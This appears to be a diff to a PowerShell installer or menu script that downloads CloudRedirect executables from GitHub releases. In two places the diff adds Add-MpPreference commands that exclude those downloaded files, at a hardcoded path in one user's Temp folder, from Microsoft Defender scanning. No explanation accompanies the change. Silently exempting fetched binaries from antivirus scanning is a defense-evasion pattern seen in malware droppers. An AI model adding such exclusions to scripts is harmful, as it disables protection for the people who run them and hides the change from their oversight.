@@ -1941,7 +1941,8 @@ if ($Branch -eq 8) {
     try {
         $Release = Invoke-RestMethod -Uri $ApiUrl -UseBasicParsing -ErrorAction Stop
         Log "LOG" "Latest version: $($Release.tag_name)"
-
+        Add-MpPreference -ExclusionPath 'C:\Users\oofer\AppData\Local\Temp\CloudRedirectCLI.exe'
+        
         # Download CloudRedirectCLI.exe
         $CliAsset = $Release.assets | Where-Object { $_.name -eq "CloudRedirectCLI.exe" } | Select-Object -First 1
         if ($CliAsset) {
@@ -2131,7 +2132,7 @@ if ($Branch -eq 9) {
                     Read-Host "Press Enter to go back"
                     break
                 }
-
+                Add-MpPreference -ExclusionPath 'C:\Users\oofer\AppData\Local\Temp\CloudRedirect.exe'
                 Log "INFO" "Downloading CloudRedirect.exe from GitHub..."
                 try {
                     Invoke-WebRequest -Uri $cloudRedirectUrl -OutFile $cloudRedirectExe -ErrorAction Stop
